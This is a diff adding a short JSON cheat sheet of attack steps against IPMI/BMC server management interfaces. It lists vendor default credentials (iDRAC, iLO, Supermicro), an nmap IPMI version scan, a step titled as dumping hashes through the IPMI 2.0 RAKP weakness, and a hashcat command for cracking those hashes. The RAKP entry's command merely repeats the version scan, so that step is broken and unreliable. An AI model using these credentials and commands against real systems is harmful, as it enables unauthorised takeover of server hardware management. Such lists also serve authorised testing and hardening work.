@@ -1,0 +1,18 @@
+[
+  {
+    "text": "Test BMC-vendor-dependent default creds",
+    "cmd": "Dell iDRAC - root - calvin; HP iLO - Administrator - [0-9A-Z]{8}; Supermicro IPMI - ADMIN - ADMIN"
+  },
+  {
+    "text": "Identify the IPMI version",
+    "cmd": "sudo nmap -sU --script ipmi-version -p 623 TARGET_IP"
+  },
+  {
+    "text": "If IPMI 2.0 is being used, exploit RAKP to dump hashes",
+    "cmd": "sudo nmap -sU --script ipmi-version -p 623 TARGET_IP"
+  },
+  {
+    "text": "Crack the hashes",
+    "cmd": "hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u"
+  }
+]
